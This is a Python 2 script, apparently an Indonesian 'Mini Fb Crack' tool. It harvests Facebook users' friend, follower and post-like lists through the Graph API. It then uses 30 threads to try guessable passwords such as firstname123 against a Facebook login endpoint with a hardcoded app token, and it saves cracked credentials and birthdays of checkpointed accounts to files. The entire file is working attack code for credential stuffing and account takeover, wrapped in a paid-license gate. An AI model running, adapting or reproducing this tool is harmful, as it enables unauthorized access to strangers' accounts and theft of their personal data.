# -*- coding: utf-8
# Made With RATU ERROR
# facebook : https://web.facebook.com/hasni.hamunkhantethapmumhun
# facebook unik : https://web.facebook.com/hasni.hamunkhantethapmumhun
# github : https://github.com/RATUCOLMEXS
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
import ipaddress
import calendar
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as par
from time import sleep
from datetime import datetime
from datetime import date
try:
	import requests
except ImportError:
	print '[×] Modul requests belum terinstall!...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def banner():                
	print
	print
	print
	jalan ('                 \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print
	jalan ('        \033[1;96mMr.hasbi Gunakan Dengan Bijak Jangan Salah Gunakan!')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤') 
kom = 'Script bang @[100006230836266:]https://www.facebook.com/100006230836266/posts/3015873888630276/?substory_index=0&app=fbl mantap Ngga Ada Obat'
kom1 = 'Aku Ijin Pake Script Mu Bang  @[100006230836266:]https://www.facebook.com/100006230836266/posts/3015873888630276/?substory_index=0&app=fbl'
kom2 = 'Script bang @[100006230836266:]https://www.facebook.com/100006230836266/posts/3015873888630276/?substory_index=0&app=fbl mantap Ngga Ada Obat'
kom3 = 'Aku Ijin Pake Script Mu Bang  @[100006230836266:]https://www.facebook.com/100006230836266/posts/3015873888630276/?substory_index=0&app=fbl'
id = []
cp = []
ok = []
loop = 0

ct = datetime.now()
n = ct.month
bulan1 = [    'Januari',   'Februari',    'Maret',    'April',    'Mei',    'Juni',    'Juli',    'Agustus',    'September',    'Oktober',    'Nopember',    'Desember']
   
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
s = requests.Session()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"
}

mb = "https://mbasic.facebook.com"
color = lambda col: "\x1b[1;"+str(col)+"m"

def check_in(uid, pw):
	ua = "Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11"
	ses = requests.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": mb,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": mb+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	try:
		run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except r.exceptions.TooManyRedirects:
		print(" [!] Redirect overload")
	if "c_user" in ses.cookies:
		print(" [✓] akun ini tidak checkpoint")
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m tersedia "+str(len(ngew))+" opsi ")
		for opt in range(len(ngew)):
			print" "*3, str(opt+1)+". "+ngew[opt]
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m "+oh)
	else:
		print(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m login gagal, silahkan cek kembali id dan password")

def buatngecek():
	print(" \033[1;96m[\033[1;97m?\033[1;96m]\033[1;97m masukan format CP/namafile")
	dirs = os.listdir("CP")
	print("")
	for file in dirs:
		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m "+file)
	files = raw_input("\n \033[1;96m[\033[1;97m?\033[1;96m]\033[1;96m PILIH FILE \033[1;97m:\033[1;93m ")
	try:
		buka_baju = open(files,"r").readlines()
	except FileNotFoundError:
		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m File tidak ada")
		time.sleep(2); main()
	print(" \033[1;96m[\033[1;97m+\033[1;96m]\033[1;96m Total Akun \033[1;97m:\033[1;93m "+str(len(buka_baju)))
	print("\033[1;96m¤"*48)
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m check: "+kontol)
		try:
			check_in(titid[0], titid[1])
		except requests.exceptions.ConnectionError:
			continue
		print("\033[1;96m¤"*48)
	print("\033[1;96m¤"*48)
	print("")
	exit(" \33[3;1m\033[1;97mSelesai.....jangan lupa \33[0;1m\033[1;93mCOLMEX's \033[1;97m")
	
def cekakun():
	print'\n \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil crack \033[1;92mOK '
	print' \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil crack CP '
	anjg = raw_input('\n \033[1;96m[\033[1;97m1\033[1;96m] PILIH\033[1;97m : ')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print""
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n [?] mau lihat hasil yang mana ?: ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalok)))
		print""
		os.system("cat OK/%s"%(file))
		raw_input("\n [*] tekan ENTER untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print""
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n [?] mau lihat hasil yang mana ?: ")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalcp)))
		print""
		os.system("cat CP/%s"%(file))
		raw_input("\n\n [*] tekan ENTER untuk kembali ke menu ")
		menu()
	else:
		menu()
		
#------->login token jangan lupa masukin token facebook jangan token listrik kontol<-------#    
def pilihlogin():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print
		print("\033[1;96m[\033[1;97m01\033[1;96m] \033[1;97mLogin via TOKEN")
		print("\033[1;96m[\033[1;97m02\033[1;96m] \033[1;97mLogin via COOKIE")
		bct = raw_input("\n[?] pilih : ")
		if bct == "":
			pilihlogin()
		elif bct == "1":
			tokenz()
		elif bct == "2":
			gen()

def gen():
	os.system('clear')
	logo()
	print
	cookie = raw_input(" Masukan Cookies Anda : ")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	menu()
                            
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		print
		logo()
		token = raw_input('\n [+] Masukkan Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			menu()
		except KeyError:
			print("[!] Token Invalid!")
			sys.exit()

def xxnx():
    try:
        toket = open('licensed.log', 'r').read()
    except IOError:
        print '\x1b[1;91m License Invalid !'
        os.system('clear')
        os.system('rm -rf licensed.log')
        lisen()

    if os.path.exists('licensed.log'):
        user1()
    else:
        lisen()

useragents = 'Mozilla/5.0 (Linux; Android 6.0.1; MotoG3-TE Build/MPDS24.107-56-1-21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36'
#------->menu crack india<-------#
def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		menu()
	except requests.exceptions.ConnectionError:
		print ('  [!] Tidak Ada Koneksi')
		sys.exit()
	banner()
	print
	print
	print" \33[3;1m\033[1;97mselamat datang......\33[0;1m\033"
	
	print
	print"  \033[1;96m[\033[1;97m01\033[1;96m] \033[1;97mCrack dari ID publik"
	print" \033[1;96m[\033[1;97m02\033[1;96m] \033[1;97mCrack dari ID followers"
	print" \033[1;96m[\033[1;97m03\033[1;96m] \033[1;97mCrack dari likes postingan publik"
	print" \033[1;96m[\033[1;97m04\033[1;96m] \033[1;97mCek hasil crack"
	print" \033[1;96m[\033[1;97m05\033[1;96m] \033[1;97mCek konfirmasi identitas account facebook"
	print" \033[1;97m[\033[1;96m00\033[1;97m] \033[1;96mRemove TOKEN/COOKIE"
	print
	pilih_india()

def pilih_india():
	ask = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;96mPILIH \033[1;97m:\033[1;93m ")
	if ask == "":
		print
		print ("     \033[1;97mpilih yang benar.......!!!") 
		exit()
	elif ask == "1" or ask == "01":
		print ("\n \033[1;97mketik '\33[3;1m\033[1;96mme\033[1;97m' \33[0;1mjika ingin crack dari daftar pencarian teman")
		print
		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print (" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m nama      :\033[1;93m "+sp["name"]) 
		except KeyError:
			print ("     \033[1;97mmaaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print ("\n \033[1;97mketik '\33[3;1m\033[1;96mme\033[1;97m' \33[0;1mjika ingin crack dari daftar pencarian teman")
		print
		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print (" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m nama      :\033[1;93m "+sp["name"]) 
		except KeyError:
			print ("     \033[1;97mmaaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "4" or ask == "04":
		print
		print" \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil \033[1;97m[\033[1;96mOK\033[1;97m]"
		print" \033[1;96m[\033[1;97m2\033[1;96m]\033[1;97m lihat hasil \033[1;96m[\033[1;97mCP\033[1;96m]"
		ress = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m]\033[1;97m pilih : ")
		if ress =="":
			menu()
		elif ress == "1" or ress == "01":
			print ("\n [+] hasil \033[1;97[\033[1;96mOK\033[1;97]\033[1;97m tanggal : \033[1;96m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		elif ress == "2" or ress == "02":
			print (" [+] hasil \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m tanggal : \033[1;96m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
			exit()
	elif ask == "5" or ask == "05":
		buatngecek()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print (" √   berhasil menghapus token") 
		exit()
	else:
		print ("     \033[1;97mpilih yang benar.......!!!") 
		exit()
	
	print"\033[1;96m [\033[1;97m!\033[1;96m]\033[1;97m total id  :\033[1;93m " +str(len(id))
	ask = raw_input("\n \033[1;96m[\033[1;97m?\033[1;96m]\033[1;97m ingin gunakan password manual (\033[1;92my\033[1;97m/\033[1;93mt\033[1;97m) : ")
	if ask == "Y" or ask == "y":
		manual()
	print
	print (" \033[1;97mmainkan data mode pesawat")
	print (" \033[1;97mdi angka \033[1;96m100 \033[1;97mdan \033[1;96m2000 \033[1;97msaat menjalankan crack")
	print(" \033[1;97mProses crack \33[3;1m\033[1;92msedang berjalan...\33[0;1m")
	print

	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[1;97m¤  %s/%s \033[1;97m[\033[1;96mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'12345']:
				ua = random.choice(["Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11"])
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97m◊\033[1;96m ' +pw+ '        '
					ok.append(uid+' • '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97m◊\033[1;96m '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + ' \033[1;96m◊\033[1;97m ' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+' \033[1;96m◊\033[1;97m '+ttl+'\n')
						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, pw, ttl))
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + '        '
					cp.append(uid+'|'+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
					save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, pw))
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n crack selesai...")
	print
	print
	exit()

def manual():
	print("\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mcontoh password : bangladesh,102030,786786")
	pw = raw_input("\033[1;96m [\033[1;97m!\033[1;96m]\033[1;97m set password :\033[1;93m ").split(",")
	print
	if len(pw) ==0:
		exit(" *  isi yang bener, tidak boleh kosong")
	print("\033[1;97m jumlah password yang di buat : \033[1;93m" +str(len(pw)))
	print (" \033[1;97mmainkan data mode pesawat")
	print (" \033[1;97mdi angka \033[1;96m100 \033[1;97mdan \033[1;96m2000 \033[1;97msaat menjalankan crack")
	print(" \033[1;97mProses crack \33[3;1m\033[1;92msedang berjalan...\33[0;1m")
	print
	
	def main(arg):
		global ok,cp,ua,loop
		print '\r \033[1;97m¤  %s/%s \033[1;97m[\033[1;92mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				ua = 'Mozilla/5.0 (Series40; NokiaC2-02/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31'
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97m◊\033[1;92m ' + asu + '        '
					ok.append(uid+' • '+asu)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('\r\033[1;97m 👉 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97m◊\033[1;96m '+str(asu)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;92m◊\033[1;97m ' + asu + ' \033[1;92m◊\033[1;97m ' + ttl)
						cp.append(uid+'|'+asu+'|'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, asu, ttl))
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + asu + '        '
					cp.append(uid+'|'+asu)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
					save.write('\033[0;97m 👉 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, asu))
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n crack selesai...")
	print
	print
	exit()

def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Memeriksa Lisensi ' + o,
        sys.stdout.flush()
        time.sleep(1)
        
def lisen():
    os.system('clear')
    logo()
    jalan('\n\x1b[1;97m [*] Mohon tunggu ...');time.sleep(1.0)
    id = uuid.uuid4().hex[:25]
    idg = open('licensed.log', 'w')
    idg.write(id)
    idg.close()
    jalan ('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi : \x1b[96m' + id)
    time.sleep(0.07)
    jalan ('\x1b[1;91m [*] Lisensi Belum Di konfirmasi\x1b[1;39m')
    time.sleep(0.07)
    jalan ('\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mChat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
    time.sleep(0.07)
    raw_input('\n\x1b[1;97m [*] Tekan Enter ')
    os.system('am start https://wa.me/+628811403654?text=Hi+badru+Beli+Lisensi+dong.%20Lisensi:%20' + id + ' >/dev/null') 
    time.sleep(1)
    os.sys.exit()
def user1():
    try:
        j = open('licensed.log', 'r').read()
        r = requests.get('https://github.com/AkinXD/license/blob/main/id').text.strip() # Jangan Di ganti bro'i nanti error
        if j in r:
            os.system('clear')
            logo()
            tik()
            jalan('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi \033[1;92mTersedia ✓')
            time.sleep(1)
            pilihlogin()
        else:
            os.system('clear')
            logo()
            tik()
            jalan ('\n\x1b[1;91m [*] Lisensi Tidak Tersedia !')
            time.sleep(1)
            lisen()
            jalan ('\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Chat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
            time.sleep(0.07)
            raw_input('\n\x1b[1;97m [*] Tekan Enter ')
            os.system('am start https://wa.me/+628811403654?text=Hi+badru+Beli+Lisensi+dong.%20Lisensi:%20' + j + ' >/dev/null')
            os.sys.exit()
    except requests.exceptions.ConnectionError:
    	os.system('clear')
        print '\x1b[1;91m [!] Tidak Ada Koneksi Data\x1b[0;97m'
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'licensed.log'])
        romz()
        
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
def logo():
	time.sleep (0.01)
 	print('')
  	print('')
  	print('')
	print ("\033[1;97m                  ▂▂▂▂\033[1;96m◢\033[1;97m╲⛤⛤╱\033[1;96m◣\033[1;97m▂▂▂▂ ")
	print ("\033[1;97m                  ◢╲╱◣\033[1;96m◥◣\033[1;97m╲╱\033[1;96m◢◤\033[1;97m◢╲╱◣ ")
	print ("\033[1;97m                  ◥◣◢◤⛥\033[1;96m◥◣◢◤\033[1;97m⛦◥◣◢◤ ")
	print ("\033[1;97m                  ◢◤◥◣⛦\033[1;96m◢◤◥◣\033[1;97m⛤◢◤◥◣ ")
	print ("\033[1;97m                  ◥╱╲◤\033[1;96m◢◤\033[1;97m╱╲\033[1;96m◥◣\033[1;97m◥╱╲◤ ")
	print ("\033[1;97m                  ▔▔▔▔\033[1;96m◥\033[1;97m╱⛤⛤╲\033[1;96m◤\033[1;97m▔▔▔▔  ")
	logo_()
def logo_():
	#os.system("clear")
	print ('''
By \x1b[0;92mMuhamad Badru Wasih
\033[1;94m   __________  ___   ________ __    __________ 
\033[1;97m / ____/ __ \/   | / ____/ //_/   / ____/ __ )
\033[1;96m / /   / /_/ / /| |/ /   / ,<     / /_  / __  |
\033[1;96m/ /___/ _, _/ ___ / /___/ /| |   / __/ / /_/ / 
\033[1;96m\____/_/ |_/_/  |_\____/_/ |_|  /_/   /_____/  
      \033[1;92m   Mini Fb Crack Simpel Crack!
* \x1b[0;93mgithub.com/AkinXD \x1b[0;97m* \x1b[0;93\n
\033[1;93m ''')

HUT = '\x1b[1;34m'
H = '\x1b[1;37m'

#------->login token jangan lupa masukin token facebook jangan token listrik kontol<-------#    
			
if __name__ == '__main__':
	buat_folder()
	xxnx()
	pilihlogin()